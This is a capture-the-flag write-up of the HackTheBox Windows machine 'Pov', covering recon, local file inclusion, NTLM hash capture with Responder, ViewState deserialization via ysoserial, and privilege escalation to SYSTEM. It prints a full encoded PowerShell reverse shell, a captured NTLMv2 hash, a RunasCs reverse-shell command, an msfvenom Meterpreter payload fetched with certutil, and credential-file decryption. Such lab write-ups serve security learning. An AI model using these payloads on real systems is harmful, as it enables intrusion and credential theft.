---
description: 'IP: 10.10.11.251 - Platform: Windows - Difficulty: Medium'
cover: ../.gitbook/assets/Pov.png
coverY: 304.53333333333336
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🟨 POV

## RECON

### Nmap&#x20;

nmap reveals that only port 80 is open. That is kinda strange for a typical machine seen on HTB. Most of the boxes tend to open port 22 (or commonly refer as SSH) as a way to remote access as user or root. The usual approach would be to grab the creds through some nefarious ways then log in SSH creds.  &#x20;

```

map -sV -sC -v -T4 10.10.11.251

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### FFUF

Using ffuf to search for subdomains that respond different with code 200/300

```
ffuf -c -u http://pov.htb -H "Host: FUZZ.pov.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 476ms]
:: Progress: [19966/19966] :: Job [1/1] :: 153 req/sec :: Duration: [0:02:13] :: Errors: 0 ::

```

Only 1 subdomain returns 302 - dev. Let add it into /etc/hosts.



## GAINING FOOTHOLD

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 022813.png" alt=""><figcaption><p>Image taken from dev.pov.htb</p></figcaption></figure>

`pov.htb` provides no indication of a possible attack vector. However, in `dev.pov.htb`, I stumbled upon LFI (Local File Incursion) when examining the parameters in the intercepted package in Burpsuite while tinkering with the web download function.

{% hint style="info" %}
**File Inclusion** vulnerability allows an attacker to include a file, usually exploiting a “dynamic file inclusion” mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:

* Code execution on the web server
* Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)
* Denial of Service (DoS)
* Sensitive Information Disclosure
{% endhint %}

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 024013.png" alt=""><figcaption><p>Jackpot!</p></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 023536.png" alt=""><figcaption><p>Finding interesting data when navigating back to the machine's hosts file</p></figcaption></figure>

It took some time to find a few intriguing files:

* `default.aspx`
* `web.config`
* `contact.aspx`



### LFI & Responder&#x20;

Now what we are going to do here is we are going to capture the NTLM hash by using Responder

{% hint style="info" %}
Responder will poison MDNS, NBT-NS, and LLMNR.\
\
And you might be asking?

What is LLMNR, NBT-NS, MDNS?\
\
The functions of the protocols LLMNR, NBT-NS, and MDNS are nearly identical.&#x20;

* Based on the Domain Name System packet format, LLMNR (Link-Local Multicast Name Resolution) is a protocol that supports all current and upcoming DNS formats, types, and classes and permits IPv4 and IPv6 hosts.
* A Net BIOS protocol called NBT-NS (Net BIOS Name Service) is used on Windows OS to convert NetBIOS names to IP addresses.
* Finally, all of the network's participants are addressed directly via the MDNS (Multicast Domain Name Service) protocol.\


If reading this is too tedious for you, just know that, Responder would attempt to obtain your NTLM hashes from the network in plain text. If you're lucky, this tool might give you a clear text username and password in addition to the password hash.
{% endhint %}

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 023514.png" alt=""><figcaption><p>Crafting a payload for Responder to catch!</p></figcaption></figure>

`file=%5C%5C10.10.X.X%5Csomefile`&#x20;

Our payload basically is \\\10.10.X.X\somefile wrap in URL encoding.

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.36]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-71DF2WLMSKI]
    Responder Domain Name      [4SLY.LOCAL]
    Responder DCE-RPC Port     [45254]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.251
[SMB] NTLMv2-SSP Username : POV\sfitz
[SMB] NTLMv2-SSP Hash     : sfitz::POV:b278d4805eceb79a:EF1631875F43CC4ED3C17B5CDC1F7A2C:0101000000000000000D8D632353DA01450CA76A8DE1A6B50000000002000800340053004C00590001001E00570049004E002D003700310044004600320057004C004D0053004B00490004003400570049004E002D003700310044004600320057004C004D0053004B0049002E00340053004C0059002E004C004F00430041004C0003001400340053004C0059002E004C004F00430041004C0005001400340053004C0059002E004C004F00430041004C0007000800000D8D632353DA0106000400020000000800300030000000000000000000000000200000B88F093AADA8A3DF9CD6AEC53146F0CE440FC2D95BEFB24CF577D47A1108E1920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330036000000000000000000

```

And this is the dead end because this hash is uncrackable. :<



### ViewState Deserialization Exploit

#### An overview of the approach

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 024507.png" alt=""><figcaption><p>Taking a look at web.config reveals some juicy info</p></figcaption></figure>

So let's talk about ViewState for a little bit:

The `ASP.NET` framework's default method for maintaining page and control values across web pages is called `ViewState`. The current state of the page and any values that must be kept during postback are serialized into base64-encoded strings and output in the `ViewState` hidden field or fields when the HTML for the page is rendered.&#x20;

> Because of its connection to the way `ASP.NET` handles `ViewState` creation and processing through the use of the `ObjectStateFormatter` for serialization and deserialization, `ViewState` by itself isn't a problem; rather, `ASP.NET`'s encryption and signature for serialized data could be compromised.

Attackers could create malicious payloads that imitate authentic `ViewState` by taking advantage of deserialization flaws in `ObjectStateFormatter`, thanks to exposed algorithms or keys.

\-> In this case, we could leverage the leak of encryption and signature keys obtained from `web.config` file.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>A list of scenarios where ViewState Deserialization flaws could be exploited</p></figcaption></figure>

Luckily, the `.NET` deserialization tool [ysoserial](https://github.com/pwntester/ysoserial.net) includes a `ViewState`-specific feature. Vulnerabilities in `ObjectStateFormatter` deserialization are caused by its use of known keys and algorithms to impersonate `ViewState` encryption and signatures.

#### Cracking the nut

With ASP.NET framework ≥ 4.5, we need to supply the _decryption algorithm_ and the _decryption key_ to the ysoserial:

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 010341.png" alt=""><figcaption><p>Crafting a serialized payload</p></figcaption></figure>

In this example, we will be using a simple PowerShell Reverse Shell encoded in Base64:

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Then, serialized it by `ysoserial` : &#x20;

```
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "PAYLOAD_IN_HERE" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="AES_KEY" --validationalg="SHA1" --validationkey="SHA1_KEY"
```

Finally, after replacing the URL encoded value of the generated payload with the value of the \_\_VIEWSTATE in the above-mentioned request, our payload will be executed.

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 011654 (1).png" alt=""><figcaption><p>Plug-in our payload!</p></figcaption></figure>

Now, we have gained a shell as <mark style="color:yellow;">`POV\sfitz`</mark>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>Got da shell!!</p></figcaption></figure>

## PRIVILEGE ESCALATION <a href="#privilege-escalation" id="privilege-escalation"></a>

### Enumeration

Getting users SID:

<pre><code><strong>PS C:\windows\system32\inetsrv> wmic useraccount get name,sid
</strong>wmic useraccount get name,sid
Name                SID                                            
Administrator       S-1-5-21-2506154456-4081221362-271687478-500   
alaading            S-1-5-21-2506154456-4081221362-271687478-1001  
DefaultAccount      S-1-5-21-2506154456-4081221362-271687478-503   
Guest               S-1-5-21-2506154456-4081221362-271687478-501   
sfitz               S-1-5-21-2506154456-4081221362-271687478-1000  
WDAGUtilityAccount  S-1-5-21-2506154456-4081221362-271687478-504
</code></pre>

So <mark style="color:yellow;">`sfitz`</mark> lacks the privilege to receive the user flag; perhaps <mark style="color:yellow;">`alaading`</mark> does?

After a bit of exploring, I find this file:

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 012116.png" alt=""><figcaption><p>Stumble upon a PSCredential file</p></figcaption></figure>

{% hint style="info" %}
**Password, Pa\$$w0rd, P455w0rd!!!**\


**Can I access the password directly from the PSCredential object?**&#x20;

* As you can see, it’s stored as a secure string.
* The password will not be returned to you in plain text by <mark style="color:orange;">**`$cred.Password`**</mark>.&#x20;
* As opposed to a password in plain text, <mark style="color:orange;">**`$cred.Password|Convertfrom-SecureString`**</mark> will ONLY provide you with cipher data.

\
The <mark style="color:orange;">**`GetNetworkCredential()`**</mark> method is a feature of the PSCredential object. This technique can be used to decrypt the password stored in the PSCredential object.

When I invoke this method and do **Get-Member,** it will show you the properties of the object and you will find a property called Password. use the last command <mark style="color:orange;">**`$cred.GetNetworkCredential().Password`**</mark> and it will return the password in plain text.&#x20;
{% endhint %}

We could directly parsing from XML:

```
PS C:\Users\sfitz\Documents> ls


    Directory: C:\Users\sfitz\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       12/25/2023   2:26 PM           1838 connection.xml                                                        


PS C:\Users\sfitz\Documents> $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *


UserName       : alaading
Password       : f8g**********1m3
SecurePassword : System.Security.SecureString
Domain         : 
```



Using the given credential, we would be using a PowerShell script to trigger a reverse shell:

```
PS C:\windows\system32\inetsrv> $username = 'alaading'
PS C:\windows\system32\inetsrv> $password = 'f8g**********1m3'
PS C:\windows\system32\inetsrv> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\windows\system32\inetsrv> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\windows\system32\inetsrv> Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {YOUR_POWERSHELL_CODE}
```

Boom?!

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 013115.png" alt=""><figcaption><p>Now we are alaading</p></figcaption></figure>

### Gaining shell as Administrator

Checking the privilege of <mark style="color:yellow;">`POV\alaading`</mark>:

```
PS C:\Users\alaading> whoami
pov\alaading
PS C:\Users\alaading> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
```

#### Understanding about **`SeDebugPrivilege`**&#x20;

By itself, `SeDebugPrivilege` gives a process the ability to view and modify the memory of other processes. Regardless of security descriptors, SeDebugPrivilege grants the token bearer access to any process or thread.&#x20;

{% hint style="info" %}
It's important to remember that attackers frequently enable this privilege in order to gain greater access to thread and process objects. Many C2 agents come with built-in code that allows you to do this instantly.\
\
Because it allows the creation of new remote threads in a target process, malware also takes advantage of this privilege to perform code injection into otherwise trustworthy processes.
{% endhint %}

As we could see on this machine, <mark style="color:yellow;">`alaading`</mark> does not have `SeDebugPrivilege` enabled. So, to bypass this, we could import [RunasCs](https://github.com/antonioCoco/RunasCs/tree/master).

**RunasCs** is a tool that allows you to use explicit credentials to run particular processes with permissions different from what our shell current provides.

As you can see below, **RunasCs** enables a list of privileges for a specific security token.

```
public static string EnableAllPrivileges(IntPtr token)
    {
        string output = "";
        string[] privileges = { "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeDelegateSessionUserImpersonatePrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };
        foreach (string privilege in privileges)
        {
            output += EnablePrivilege(privilege, token);
        }
        return output;
    }
```

We would use it to spawn another shell:

```
PS C:\Users\alaading> .\RunasCs.exe alaading f8g**********1m3 cmd.exe -r 10.10.X.X:7777 --bypass-uac

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-78c62$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1480 created in background.
```

Catch it with nc:

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 020018.png" alt=""><figcaption><p>Getting a new shell with RunasCs</p></figcaption></figure>

Checking on the privilege info reveals suprising discovery:&#x20;

```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 

C:\Windows\system32>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

With **`SeDebugPrivilege`** enabled, we can upload a Meterpreter shell to the machine and gain leverage access as Administrator.

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 020419.png" alt=""><figcaption><p>Crafting our payload</p></figcaption></figure>

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=X -f exe -o payload.exe
```

To get the malicious payload onto the target computer, host it on a Python http.server and then use:

```
certutil.exe -urlcache -f http://IP:PORT/payload.exe payload.exe
```

Finally, execute it by:

```
.\payload.exe
```

And voilà!!

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 020507.png" alt=""><figcaption><p>We got the shell.</p></figcaption></figure>

Now, one of the oldest tricks on the book is to migrate into another Windows processes:

{% hint style="info" %}
There are many cases where you need to "migrate" a specific Windows working process, typically a shell.

* An unstable shell.
* Migrate from a 32-bit process to a 64-bit process.
* Dealing with exploits require an interactive session.
{% endhint %}

This can be easily completed if you have a Meterpreter shell. All you have to do is wait for process migration to occur after launching the "migrate" command with the PID specified. In technical terms, by creating a thread inside another process, this is more of a malicious code injection than a true migration, and Meterpreter is exceptional at doing this. It creates a new remote thread and injects your current session into it, along with all of your loaded extensions and configurations.

By migrating into a more privileged process, we should be able to gain NT AUTHRITY:

```
(Meterpreter 5)(C:\Windows\system32) > shell
Process 2780 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-Process svchost
Get-Process svchost

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    233      13     2712      12468       0.08     68   0 svchost                                                      
    147       7     1340       6196       0.00    320   0 svchost                                                      
    195      11     1748       8436       0.13    340   0 svchost                                                      
    340      13     9756      14320      14.05    356   0 svchost                                                      
    306      20     9508      14756       0.16    716   0 svchost                                                      
     96       5      900       4008       0.00    740   0 svchost                                                      
    765      16     5200      15036       0.56    760   0 svchost                                                      
    681      16     3668      10192       0.69    832   0 svchost                                                      
    245      10     1672       7032       0.08    880   0 svchost                                                      
    276      13     3712      11508       1.11   1008   0 svchost                                                      
    127      15     3164       7456       0.08   1064   0 svchost                                                      
    175       9     1696       7920       0.05   1120   0 svchost                                                      
    221       9     2196       7792       0.20   1132   0 svchost                                                      
    233      12     2620      11760       1.08   1160   0 svchost                                                      
    130       7     1236       5816       0.02   1168   0 svchost                                                      
    427       9     2676       9196       0.20   1176   0 svchost                                                      
    136       7     1236       5900       0.03   1284   0 svchost                                                      
    141      10     1316       5988       0.02   1300   0 svchost                                                      
    360      17     4980      14548       0.44   1340   0 svchost                                                      
    347      15     3904      11436       0.06   1356   0 svchost                                                      
    325      13     2020       9252       0.06   1412   0 svchost                                                      
    232      13     2784       8360       0.63   1420   0 svchost                                                      
    186      11     1880       8352       0.14   1528   0 svchost                                                      
    328      10     2416       8736       0.28   1536   0 svchost                                                      
    150       9     1568       6988       0.02   1652   0 svchost                                                      
    130       7     1300       5940       0.03   1676   0 svchost                                                      
    404      32     7772      17016       5.97   1736   0 svchost                                                      
    171       9     2040       7632       0.16   1744   0 svchost                                                      
    198      11     1940       8392       2.30   1792   0 svchost                                                      
    176      12     3860      11384       0.05   1808   0 svchost                                                      
    194      22     2612      10444       0.09   1816   0 svchost                                                      
    178       9     1772       8588       0.02   1828   0 svchost                                                      
    416      19    17296      31212       3.39   2060   0 svchost                                                      
    399      16    11644      20868      13.89   2072   0 svchost                                                      
    145       9     1520       6716       0.05   2104   0 svchost                                                      
    145       8     1560       6468       0.02   2144   0 svchost                                                      
    137       7     1220       5600       0.03   2192   0 svchost                                                      
    213      11     1948       7228       0.02   2204   0 svchost                                                      
    208      11     2180       8508       1.75   2224   0 svchost                                                      
    175      10     2120      13244       0.06   2324   0 svchost                                                      
    213      12     1732       7532       0.02   2332   0 svchost                                                      
    247      15     5040      12768       0.17   2348   0 svchost                                                      
    279      23     3636      12656       0.14   2636   0 svchost                                                      
    466      18     3148      11832       0.11   2652   0 svchost                                                      
    146       8     1604       7652       0.02   2848   0 svchost                                                      
    409      26     3428      13296       0.09   2948   0 svchost                                                      
    164      10     1972       7784       0.11   3256   0 svchost                                                      
    195      15     6008      10324       0.03   4044   0 svchost                                                      
    309      16    15252      17764      20.48   4260   0 svchost                                                      
    175       9     3052       7948       0.00   4476   0 svchost                                                      
    322      18     6428      22780       0.36   4580   0 svchost                                                      
    136       8     2820      10036       0.23   4748   0 svchost                                                      
    148       9     1572       6640       0.05   4952   0 svchost
```

Lastly, take the PID and let Meterpreter handle everything:

```
(Meterpreter 5)(C:\Windows\system32) > migrate 340
[*] Migrating from 552 to 340...
[*] Migration completed successfully.
```

**Avada Kedavra** :tada:

```
(Meterpreter 5)(C:\Windows\system32) > shell
Process 4196 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0899-6CAF

 Directory of C:\Users\Administrator\Desktop

01/15/2024  04:11 AM    <DIR>          .
01/15/2024  04:11 AM    <DIR>          ..
01/29/2024  10:53 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,227,570,688 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
441fb********************3f76ce1

```



## Resources

* [https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter)
* [https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege](https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege)
